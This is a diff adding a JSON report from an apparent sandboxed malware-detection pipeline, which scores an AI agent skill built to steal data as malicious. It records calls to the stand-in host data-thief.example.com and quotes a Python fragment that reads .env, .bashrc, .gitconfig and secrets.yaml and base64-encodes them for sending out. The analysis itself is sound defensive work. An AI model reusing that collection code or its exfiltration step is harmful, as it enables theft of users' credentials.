@@ -1,0 +1,272 @@
+{
+  "status": "ok",
+  "outdir": "workshop_malicious_output_final/batch_detect_malicious/Charpup-skill-security-auditor-data-exfiltration-skill",
+  "skill_name": "Charpup-skill-security-auditor-data-exfiltration-skill",
+  "documented_purpose": "Dynamic analysis of installed agent skill based on observed runtime behavior",
+  "verdict": "malicious",
+  "score": 100.0,
+  "score_scale": "0-100",
+  "confidence": "high",
+  "num_patterns": 4,
+  "num_raw_patterns": 4,
+  "num_executed_patterns": 1,
+  "num_intent_only_patterns": 3,
+  "num_executed_malicious_patterns": 1,
+  "num_high_executed_patterns": 1,
+  "num_medium_executed_patterns": 0,
+  "num_strong_intent_patterns": 1,
+  "num_supporting_intent_patterns": 2,
+  "binary_mode": true,
+  "malicious_threshold": 80.0,
+  "suspicious_threshold": 40.0,
+  "aggregation_formula": "min(100, max(S) + 0.1 * sum(S_except_max)); high-risk executed evidence is >=100, strong blocked intent is >=85, weak/supporting-only evidence is capped at 60, and noise-only evidence is capped at 30",
+  "severity_weights": {
+    "low": 40,
+    "medium": 70,
+    "high": 100
+  },
+  "reason": "Dynamic risk score 100.0 exceeded the malicious threshold 80.0.",
+  "network_indicators": {
+    "contacted_domains": [
+      "api.anthropic.com",
+      "data-thief.example.com",
+      "data-thief.example.com.asia-southeast2-a.c.cs-poc-t2pujzx25dhamp5fwmxhcwi.internal",
+      "data-thief.example.com.c.cs-poc-t2pujzx25dhamp5fwmxhcwi.internal",
+      "data-thief.example.com.google.internal",
+      "elliott.ns.cloudflare.com",
+      "http-intake.logs.us5.datadoghq.com",
+      "ns.asia-southeast2.gcedns-prod.internal",
+      "ns.global.gcedns-prod.internal"
+    ],
+    "contacted_ips": [
+      "172.17.0.2",
+      "169.254.169.254",
+      "160.79.104.10",
+      "34.149.66.137"
+    ],
+    "contacted_urls": [],
+    "embedded_urls": []
+  },
+  "execution_indicators": {
+    "command_patterns": [
+      "ls -la <skill dir>",
+      "mkdir -p /home/appuser/workdir; python3 --version; which python3",
+      "create dummy .env/.bashrc/config.json/secrets.yaml/sample.txt in /home/appuser/workdir",
+      "python3: import TOOL.py by path and call process_sensitive_data({...dummy...}) from cwd=/home/appuser/workdir",
+      "python3: socket.getaddrinfo('data-thief.example.com', 443) (DNS probe, no data sent)",
+      "python3: reconstruct base64 exfil payload from dummy files (no network)",
+      "43    execve(\"/usr/bin/id\", [\"id\", \"-u\"], 0x64c3ae8c7120 /* 22 vars */) = 0",
+      "44    execve(\"/usr/bin/cat\", [\"cat\", \"/tmp/user_prompt.txt\"], 0x64c3ae8cc8f0 /* 22 vars */ <unfinished ...>",
+      "56    execve(\"/usr/bin/git\", [\"/usr/bin/git\", \"config\", \"--get\", \"remote.origin.url\"], 0x30cebf74510 /* 28 vars */) = 0",
+      "58    execve(\"/usr/lib/node_modules/@anthropic-ai/claude-code/bin/claude.exe\", [\"rg\", \"--version\"], 0x30cec18c648 /* 24 vars */) = 0",
+      "59    execve(\"/usr/lib/node_modules/@anthropic-ai/claude-code/bin/claude.exe\", [\"rg\", \"--no-config\", \"--files\", \"--hidden\", \"--no-ignore\", \"--max-depth\", \"4\", \"--glob\", \".orphaned_at\", \"/home/appuser/.claude/plugins/cache\"], 0x30cebf76c10 /* 28 vars */) = 0",
+      "61    execve(\"/bin/sh\", [\"/bin/sh\", \"-c\", \"ps aux | grep -E \\\"code|cursor|windsurf|devin-desktop|idea|pycharm|webstorm|phpstorm|rubymine|clion|goland|rider|datagrip|dataspell|aqua|gateway|fleet|android-studio\\\" | grep -v grep\"], 0x30cecae2310 /* 29 vars */) = 0",
+      "64    execve(\"/usr/bin/grep\", [\"grep\", \"-v\", \"grep\"], 0x5a398b373c68 /* 29 vars */ <unfinished ...>",
+      "62    execve(\"/usr/bin/ps\", [\"ps\", \"aux\"], 0x5a398b373c38 /* 29 vars */ <unfinished ...>",
+      "63    execve(\"/usr/bin/grep\", [\"grep\", \"-E\", \"code|cursor|windsurf|devin-desktop|idea|pycharm|webstorm|phpstorm|rubymine|clion|goland|rider|datagrip|dataspell|aqua|gateway|fleet|android-studio\"], 0x5a398b373d18 /* 29 vars */ <unfinished ...>",
+      "66    execve(\"/bin/zsh\", [\"/bin/zsh\", \"--version\"], 0x30cecae2a10 /* 29 vars */) = -1 ENOENT (No such file or directory)",
+      "67    execve(\"/usr/bin/zsh\", [\"/usr/bin/zsh\", \"--version\"], 0x30cecae2d90 /* 29 vars */) = -1 ENOENT (No such file or directory)",
+      "68    execve(\"/usr/local/bin/zsh\", [\"/usr/local/bin/zsh\", \"--version\"], 0x30cecae3110 /* 29 vars */) = -1 ENOENT (No such file or directory)",
+      "69    execve(\"/opt/homebrew/bin/zsh\", [\"/opt/homebrew/bin/zsh\", \"--version\"], 0x30cecae1c10 /* 29 vars */) = -1 ENOENT (No such file or directory)",
+      "70    execve(\"/bin/bash\", [\"/bin/bash\", \"-c\", \"env\"], 0x30cecae3110 /* 32 vars */) = 0",
+      "70    execve(\"/usr/bin/env\", [\"env\"], 0x5c7f082207a0 /* 32 vars */) = 0",
+      "72    execve(\"/usr/bin/id\", [\"id\", \"-u\"], 0x62c5d2318c10 /* 31 vars */) = 0",
+      "74    execve(\"/usr/bin/cut\", [\"cut\", \"-d \", \"-f3\"], 0x62c5d2320840 /* 31 vars */) = 0",
+      "75    execve(\"/usr/bin/grep\", [\"grep\", \"-vE\", \"^_[^_]\"], 0x62c5d2320840 /* 31 vars */ <unfinished ...>",
+      "78    execve(\"/usr/bin/head\", [\"head\", \"-n\", \"1000\"], 0x62c5d2320840 /* 31 vars */) = 0",
+      "80    execve(\"/usr/bin/grep\", [\"grep\", \"on\"], 0x62c5d2320840 /* 31 vars */ <unfinished ...>",
+      "81    execve(\"/usr/bin/awk\", [\"awk\", \"{print \\\"set -o \\\" $1}\"], 0x62c5d2320840 /* 31 vars */ <unfinished ...>",
+      "82    execve(\"/usr/bin/head\", [\"head\", \"-n\", \"1000\"], 0x62c5d2320840 /* 31 vars */ <unfinished ...>",
+      "84    execve(\"/usr/bin/sed\", [\"sed\", \"s/^alias //g\"], 0x62c5d2320840 /* 31 vars */) = 0",
+      "85    execve(\"/usr/bin/sed\", [\"sed\", \"s/^/alias -- /\"], 0x62c5d2320840 /* 31 vars */ <unfinished ...>",
+      "86    execve(\"/usr/bin/head\", [\"head\", \"-n\", \"1000\"], 0x62c5d2320840 /* 31 vars */ <unfinished ...>",
+      "87    execve(\"/usr/bin/cat\", [\"cat\"], 0x62c5d2320840 /* 31 vars */) = 0",
+      "88    execve(\"/usr/bin/cat\", [\"cat\"], 0x62c5d2320840 /* 31 vars */) = 0",
+      "89    execve(\"/usr/bin/cat\", [\"cat\"], 0x62c5d2320840 /* 31 vars */) = 0",
+      "92    execve(\"/usr/bin/ls\", [\"ls\", \"-la\", \"/home/appuser/.claude/skills/Charpup-skill-security-auditor-data-exfiltration-skill\"], 0x598819e521a0 /* 34 vars */) = 0",
+      "96    execve(\"/usr/bin/mkdir\", [\"mkdir\", \"-p\", \"/home/appuser/workdir\"], 0x640f560fd1a0 /* 34 vars */) = 0",
+      "97    execve(\"/usr/local/bin/python3\", [\"python3\", \"--version\"], 0x640f560fd1a0 /* 34 vars */) = 0",
+      "98    execve(\"/usr/bin/which\", [\"which\", \"python3\"], 0x640f560fd1a0 /* 34 vars */) = 0",
+      "101   execve(\"/usr/bin/ls\", [\"ls\", \"-la\", \"/home/appuser/workdir\"], 0x5cb5085babb0 /* 34 vars */) = 0",
+      "104   execve(\"/usr/local/bin/python3\", [\"python3\", \"-\"], 0x59098b43fc40 /* 34 vars */) = 0",
+      "107   execve(\"/usr/local/bin/python3\", [\"python3\", \"-\"], 0x63caba0426e0 /* 34 vars */) = 0",
+      "110   execve(\"/usr/local/bin/python3\", [\"python3\", \"-\"], 0x62864d03b890 /* 34 vars */) = 0"
+    ],
+    "execution_parents": [
+      "id",
+      "cat",
+      "git",
+      "claude.exe",
+      "sh",
+      "grep",
+      "ps",
+      "zsh",
+      "bash",
+      "env",
+      "cut",
+      "head",
+      "awk",
+      "sed",
+      "ls",
+      "mkdir",
+      "python3",
+      "which"
+    ],
+    "tool_call_patterns": [
+      "ls -la <skill dir>",
+      "mkdir -p /home/appuser/workdir; python3 --version; which python3",
+      "create dummy .env/.bashrc/config.json/secrets.yaml/sample.txt in /home/appuser/workdir",
+      "python3: import TOOL.py by path and call process_sensitive_data({...dummy...}) from cwd=/home/appuser/workdir",
+      "python3: socket.getaddrinfo('data-thief.example.com', 443) (DNS probe, no data sent)",
+      "python3: reconstruct base64 exfil payload from dummy files (no network)",
+      "{'command': 'Running process_sensitive_data() from the real home directory (cwd=/home/appuser)', 'reason': 'would read real ~/.env, ~/.bashrc, ~/.gitconfig — credential access; isolated to /home/appuser/workdir with dummy files instead'}",
+      "{'command': '_send_to_server() delivering a payload containing real secrets to data-thief.example.com:443', 'reason': 'irreversible data exfiltration of private data; only dummy data was ever in scope and the host does not resolve'}",
+      "Running process_sensitive_data() from the real home directory (cwd=/home/appuser) | reason: would read real ~/.env, ~/.bashrc, ~/.gitconfig — credential access; isolated to /home/appuser/workdir with dummy files instead",
+      "_send_to_server() delivering a payload containing real secrets to data-thief.example.com:443 | reason: irreversible data exfiltration of private data; only dummy data was ever in scope and the host does not resolve"
+    ]
+  },
+  "file_indicators": {
+    "bundled_files": [],
+    "dropped_files": [
+      "{'path': '/home/appuser/.claude/.last-cleanup', 'after': '-rw-r--r--\\t24\\t2026-06-17 07:50:01.2487636260\\t/home/appuser/.claude/.last-cleanup'}",
+      "{'path': '/home/appuser/.claude/backups', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:51:22.8286040850\\t/home/appuser/.claude/backups'}",
+      "{'path': '/home/appuser/.claude/backups/.claude.json.backup.1781682595540', 'after': '-rw-r--r--\\t33\\t2026-06-17 07:49:55.5411670640\\t/home/appuser/.claude/backups/.claude.json.backup.1781682595540'}",
+      "{'path': '/home/appuser/.claude/backups/.claude.json.backup.1781682682828', 'after': '-rw-r--r--\\t24323\\t2026-06-17 07:51:22.8286040850\\t/home/appuser/.claude/backups/.claude.json.backup.1781682682828'}",
+      "{'path': '/home/appuser/.claude/policy-limits.json', 'after': '-rw-------\\t359\\t2026-06-17 07:49:56.0484145290\\t/home/appuser/.claude/policy-limits.json'}",
+      "{'path': '/home/appuser/.claude/projects', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:49:56.2445515830\\t/home/appuser/.claude/projects'}",
+      "{'path': '/home/appuser/.claude/projects/-home-appuser', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:50:01.1880099920\\t/home/appuser/.claude/projects/-home-appuser'}",
+      "{'path': '/home/appuser/.claude/projects/-home-appuser/bbc12289-0d98-448a-9146-972c69fbcdab.jsonl', 'after': '-rw-------\\t73152\\t2026-06-17 07:51:22.5444587410\\t/home/appuser/.claude/projects/-home-appuser/bbc12289-0d98-448a-9146-972c69fbcdab.jsonl'}",
+      "{'path': '/home/appuser/.claude/session-env', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:49:59.6817170180\\t/home/appuser/.claude/session-env'}",
+      "{'path': '/home/appuser/.claude/session-env/bbc12289-0d98-448a-9146-972c69fbcdab', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:49:59.6817170180\\t/home/appuser/.claude/session-env/bbc12289-0d98-448a-9146-972c69fbcdab'}",
+      "{'path': '/home/appuser/.claude/sessions', 'after': 'drwx------\\t4096\\t2026-06-17 07:51:22.5282199040\\t/home/appuser/.claude/sessions'}",
+      "{'path': '/home/appuser/.claude/shell-snapshots', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:51:22.5312201050\\t/home/appuser/.claude/shell-snapshots'}",
+      "{'path': '/home/appuser/.claude/skills/Charpup-skill-security-auditor-data-exfiltration-skill/__pycache__', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:50:39.0853578250\\t/home/appuser/.claude/skills/Charpup-skill-security-auditor-data-exfiltration-skill/__pycache__'}",
+      "{'path': '/home/appuser/.claude/skills/Charpup-skill-security-auditor-data-exfiltration-skill/__pycache__/TOOL.cpython-310.pyc', 'after': '-rw-r--r--\\t1304\\t2026-06-17 07:50:39.0853578250\\t/home/appuser/.claude/skills/Charpup-skill-security-auditor-data-exfiltration-skill/__pycache__/TOOL.cpython-310.pyc'}",
+      "{'path': '/home/appuser/workdir/.bashrc', 'after': '-rw-r--r--\\t22\\t2026-06-17 07:50:32.4618589590\\t/home/appuser/workdir/.bashrc'}",
+      "{'path': '/home/appuser/workdir/.env', 'after': '-rw-r--r--\\t45\\t2026-06-17 07:50:32.4612905900\\t/home/appuser/workdir/.env'}",
+      "{'path': '/home/appuser/workdir/config.json', 'after': '-rw-r--r--\\t30\\t2026-06-17 07:50:32.4628590260\\t/home/appuser/workdir/config.json'}",
+      "{'path': '/home/appuser/workdir/sample.txt', 'after': '-rw-r--r--\\t18\\t2026-06-17 07:50:32.4653566420\\t/home/appuser/workdir/sample.txt'}",
+      "{'path': '/home/appuser/workdir/secrets.yaml', 'after': '-rw-r--r--\\t20\\t2026-06-17 07:50:32.4638590930\\t/home/appuser/workdir/secrets.yaml'}",
+      "{'path': '/tmp/claude-1000', 'after': 'drwx------\\t4096\\t2026-06-17 07:49:59.6865855970\\t/tmp/claude-1000'}",
+      "{'path': '/tmp/claude-1000/-home-appuser', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:49:59.6870240320\\t/tmp/claude-1000/-home-appuser'}",
+      "{'path': '/tmp/claude-1000/-home-appuser/bbc12289-0d98-448a-9146-972c69fbcdab', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:49:59.6870240320\\t/tmp/claude-1000/-home-appuser/bbc12289-0d98-448a-9146-972c69fbcdab'}",
+      "{'path': '/tmp/claude-1000/-home-appuser/bbc12289-0d98-448a-9146-972c69fbcdab/tasks', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:50:57.3325285210\\t/tmp/claude-1000/-home-appuser/bbc12289-0d98-448a-9146-972c69fbcdab/tasks'}",
+      "{'path': '/tmp/fs_after.txt', 'after': '-rw-r--r--\\t0\\t2026-06-17 07:51:23.5222866370\\t/tmp/fs_after.txt'}",
+      "{'path': '/home/appuser', 'before': 'drwxr-xr-x\\t4096\\t2026-06-17 07:49:53.8552673030\\t/home/appuser', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:51:22.8343500240\\t/home/appuser'}",
+      "{'path': '/home/appuser/.claude', 'before': 'drwxr-xr-x\\t4096\\t2026-06-17 07:49:53.8532671690\\t/home/appuser/.claude', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:50:01.2487636260\\t/home/appuser/.claude'}",
+      "{'path': '/home/appuser/.claude.json', 'before': '-rw-r--r--\\t33\\t2026-06-17 07:49:53.8562673700\\t/home/appuser/.claude.json', 'after': '-rw-r--r--\\t24406\\t2026-06-17 07:51:22.8306943700\\t/home/appuser/.claude.json'}",
+      "{'path': '/home/appuser/.claude/skills/Charpup-skill-security-auditor-data-exfiltration-skill', 'before': 'drwxr-xr-x\\t4096\\t2026-06-17 07:49:53.8610688220\\t/home/appuser/.claude/skills/Charpup-skill-security-auditor-data-exfiltration-skill', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:50:39.0843035200\\t/home/appuser/.claude/skills/Charpup-skill-secu...",
+      "{'path': '/home/appuser/workdir', 'before': 'drwxr-xr-x\\t4096\\t2026-06-17 07:49:53.8552673030\\t/home/appuser/workdir', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:50:32.4638590930\\t/home/appuser/workdir'}",
+      "{'path': '/tmp', 'before': 'drwxrwxrwt\\t4096\\t2026-06-17 07:49:54.8943370550\\t/tmp', 'after': 'drwxrwxrwt\\t4096\\t2026-06-17 07:51:23.5222866370\\t/tmp'}",
+      "{'path': '/tmp/fs_before.txt', 'before': '-rw-r--r--\\t0\\t2026-06-17 07:49:54.8943370550\\t/tmp/fs_before.txt', 'after': '-rw-r--r--\\t1569\\t2026-06-17 07:49:54.8973372570\\t/tmp/fs_before.txt'}"
+    ],
+    "file_patterns": [
+      "46    openat(AT_FDCWD, \"/home/appuser/.claude/.credentials.json\", O_RDONLY|O_NOCTTY <unfinished ...>",
+      "99    openat(AT_FDCWD, \".env\", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 3",
+      "99    openat(AT_FDCWD, \"secrets.yaml\", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 3",
+      "104   openat(AT_FDCWD, \".env\", O_RDONLY|O_CLOEXEC) = 3",
+      "104   openat(AT_FDCWD, \"secrets.yaml\", O_RDONLY|O_CLOEXEC) = 3",
+      "110   write(4, \"import json, base64\\ncollected={\\\"user_inputs\\\":{\\\"user\\\":\\\"test@example.com\\\"},\\\"system_info\\\":{},\\\"file_contents\\\":{}}\\nfor fn in [\\\".env\\\",\\\".bashrc\\\",\\\".zshrc\\\",\\\".gitconfig\\\",\\\"config.json\\\",\\\"secrets.yaml\\\"]:\\n    try:\\n        collected[\\\"file_contents\\\"][fn]=open(fn).read()\\n    except: pass\\nenc=base64.b64encode(json.dumps(...",
+      "110   openat(AT_FDCWD, \".env\", O_RDONLY|O_CLOEXEC) = 3",
+      "110   openat(AT_FDCWD, \"secrets.yaml\", O_RDONLY|O_CLOEXEC) = 3",
+      "/home/appuser/workdir/.bashrc",
+      "/home/appuser/.claude/shell-snapshots"
+    ],
+    "certificate_fingerprints": []
+  },
+  "detected_malicious_patterns": [
+    {
+      "pattern": "persistence_installation",
+      "severity": "high",
+      "base_weight": 100,
+      "effective_score": 100.0,
+      "evidence_type": "executed",
+      "artifacts": [
+        "filesystem_changes.json"
+      ],
+      "executed": true,
+      "pattern_confidence": "high",
+      "summary": "Persistence-related files were created or modified during execution.",
+      "evidence": {
+        "persistence_modified": [
+          "/home/appuser/workdir/.bashrc"
+        ]
+      },
+      "evidence_short": "file=/home/appuser/workdir/.bashrc"
+    },
+    {
+      "pattern": "credential_exfiltration_intent",
+      "severity": "high",
+      "base_weight": 100,
+      "effective_score": 85.0,
+      "evidence_type": "strong_intent_only",
+      "artifacts": [
+        "claude_output.txt"
+      ],
+      "executed": false,
+      "pattern_confidence": "high",
+      "summary": "Skill contains credential theft or data exfiltration intent indicators.",
+      "evidence": {
+        "primitive_evidence": [
+          "running process_sensitive_data() from the real home directory (cwd=/home/appuser) | reason: would read real ~/.env, ~/.bashrc, ~/.gitconfig — credential access; isolated to /home/appuser/workdir with dummy files instead _send_to_server() delivering a pay",
+          "e running process_sensitive_data() from the real home directory (cwd=/home/appuser) | reason: would read real ~/.env, ~/.bashrc, ~/.gitconfig — credential access; isolated to /home/appuser/workdir with dummy files instead _send_to_server() delivering a pay",
+          "ver.\", \"files_inspected\": [ \"/home/appuser/.claude/skills/charpup-skill-security-auditor-data-exfiltration-skill/skill.md\", \"/home/appuser/.claude/skills/charpup-skill-security-auditor-data-exfiltration-skill/tool.py\" ], \"commands_executed\": [ \"ls -la <skill dir>\", \"mkdir -p /home/appuser/workdir; python3 --version;"
+        ],
+        "commands_skipped": [
+          "Running process_sensitive_data() from the real home directory (cwd=/home/appuser) | reason: would read real ~/.env, ~/.bashrc, ~/.gitconfig — credential access; isolated to /home/appuser/workdir with dummy files instead",
+          "_send_to_server() delivering a payload containing real secrets to data-thief.example.com:443 | reason: irreversible data exfiltration of private data; only dummy data was ever in scope and the host does not resolve"
+        ],
+        "skipped_unsafe_commands": [
+          "Running process_sensitive_data() from the real home directory (cwd=/home/appuser) | reason: would read real ~/.env, ~/.bashrc, ~/.gitconfig — credential access; isolated to /home/appuser/workdir with dummy files instead",
+          "_send_to_server() delivering a payload containing real secrets to data-thief.example.com:443 | reason: irreversible data exfiltration of private data; only dummy data was ever in scope and the host does not resolve"
+        ]
+      },
+      "evidence_short": "primitive=running process_sensitive_data() from the real home directory (cwd=/home/appuser) | reason: would read real ~/.env, ~/.bashrc, ~/.gitconfig — credential access; isolated to /hom...; command=Running process_sensitive_data() from the real home directory (cwd=/home/appuser) | reason: would read real ~/.env, ~/.bashrc, ~/.gitconfig — credential access; isolated to /hom..."
+    },
+    {
+      "pattern": "sensitive_action_request",
+      "severity": "high",
+      "base_weight": 100,
+      "effective_score": 50.0,
+      "evidence_type": "supporting_intent_only",
+      "artifacts": [
+        "claude_output.txt"
+      ],
+      "executed": false,
+      "pattern_confidence": "high",
+      "summary": "Agent output requested access to sensitive credentials or private data.",
+      "evidence": {
+        "agent_sensitive_requests": [
+          "exfiltrate"
+        ]
+      },
+      "evidence_short": "request=exfiltrate"
+    },
+    {
+      "pattern": "unsafe_command_skipped",
+      "severity": "medium",
+      "base_weight": 70,
+      "effective_score": 35.0,
+      "evidence_type": "supporting_intent_only",
+      "artifacts": [
+        "claude_output.txt"
+      ],
+      "executed": false,
+      "pattern_confidence": "medium",
+      "summary": "Unsafe command was identified and skipped during safe sandbox execution.",
+      "evidence": {
+        "skipped_unsafe_commands": [
+          "Running process_sensitive_data() from the real home directory (cwd=/home/appuser) | reason: would read real ~/.env, ~/.bashrc, ~/.gitconfig — credential access; isolated to /home/appuser/workdir with dummy files instead",
+          "_send_to_server() delivering a payload containing real secrets to data-thief.example.com:443 | reason: irreversible data exfiltration of private data; only dummy data was ever in scope and the host does not resolve"
+        ],
+        "unsafe_command_instructions": [
+          "irreversible",
+          "credential",
+          "Running process_sensitive_data() from the real home directory (cwd=/home/appuser) | reason: would read real ~/.env, ~/.bashrc, ~/.gitconfig — credential access; isolated to /home/appuser/workdir with dummy files instead",
+          "_send_to_server() delivering a payload containing real secrets to data-thief.example.com:443 | reason: irreversible data exfiltration of private data; only dummy data was ever in scope and the host does not resolve"
+        ]
+      },
+      "evidence_short": "skipped=Running process_sensitive_data() from the real home directory (cwd=/home/appuser) | reason: would read real ~/.env, ~/.bashrc, ~/.gitconfig — credential access; isolated to /hom..."
+    }
+  ]
+}
